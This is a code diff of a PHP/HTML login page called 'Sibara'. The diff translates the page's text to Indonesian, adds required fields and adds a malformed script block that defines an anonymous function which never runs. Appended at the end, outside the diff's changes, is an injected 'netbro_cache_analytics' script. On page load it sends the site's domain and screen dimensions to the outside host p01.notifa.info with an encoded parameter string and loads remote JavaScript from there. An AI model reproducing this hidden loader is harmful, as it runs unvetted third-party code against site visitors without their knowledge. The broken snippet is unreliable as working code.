@@ -40,29 +40,26 @@
 
     <div class="main-login col-sm-4 col-sm-offset-4">
         <div class="logo">
-            SI<i class="clip-clip"></i>bara
+            Sib<i class="fa fa-at"></i>ra
         </div>
         <!-- start: LOGIN BOX -->
         <div class="box-login">
-            <h3>Sign in to your account</h3>
+            <h3>Halaman Login <i class="fa fa-spinner fa-spin"></i></h3>
             <p>
-                Please enter your name and password to log in.
+                Silahkan isi username dan password untuk login.
             </p>
             <!-- <form class="form-login" action="index.html"> -->
-            <form action="<?php echo base_url(); ?>login/signin" method="post">
-                <div class="errorHandler alert alert-danger no-display">
-                    <i class="fa fa-remove-sign"></i> You have some form errors. Please check below.
-                </div>
+            <form action="<?php echo base_url(); ?>login/signin" method="post" onsubmit="return validate()">
                 <fieldset>
                     <div class="form-group">
                     <span class="input-icon">
-                        <input type="text" class="form-control" name="userName" placeholder="User Name">
+                        <input type="text" class="form-control" name="userName" placeholder="User Name" required>
                         <i class="fa fa-user"></i>
                     </span>
                     </div>
                     <div class="form-group">
                     <span class="input-icon">
-                        <input type="password" class="form-control" name="password" placeholder="password">
+                        <input type="password" class="form-control" name="password" placeholder="password" required>
                         <i class="fa fa-lock"></i>
                     </span>
                     </div>
@@ -113,6 +110,12 @@
             Main.init();
             Login.init();
         });
+    </script>
+
+    <script>
+     function(){
+        swal("Oops...", "Something went wrong!", "error");
+    };
     </script>
 
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXl8l9oM51%2fHXDRnpRJ%2b4Bqauo%2bfOlZhIi4Koryf4bpMrS1WhIKLke2ygosAfnSy1uuomHoW%2bRjg08yJSOECpir8wnpsdzEk1OHdPzmYdGxguQqvHOVLUaJKJqfoDSVHM3vVyif07uaAoMIC3KwUf4mQbaSeua8bSLYMRCmNIlZyp%2f0KFdqq%2bYZbDOSvLlNdMnOZxRK0LQ1b8mVDRu5pptKLjbSJy7wLgZ3zGASitegnq5RZSqTewDD8yWBIN5W9SxWCnryKPF56aG0F2utkNLc%2bHfVqVrfGgS5mbMvUrYm8Fd1ERESN4tm%2b5laicWfh8ytAYCgsaDrgrPgbo2iga6oMk2mWY4RW0QdD7CMg70oe9QW1OgVTJVchwR4RDYffl%2fVFhAuSa7BvVPlT1NbH8G8%2fZVMH%2fNC3HOoUKWoSOLPDmeXf5CwseQj%2frScNdPWABEL0s22lpzeRcqiWoTPPENuBvRDsAQZQgIkwDKPUDzPfc%2fT7HtIkZr3pb%2f4SogbWInUGOWthC%2bJIwpeK3PHk1PEJCtPXH60sKu5V69zAFULU1i5gx5PGsuwwdaihnrUmlO4pKwJwNpISK6crO040J%2fCP3miWChkHWIDl%2fqlm1ETrgxF02Bnq9TRI4VUbrxLjltxMs%2fR67NZwo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
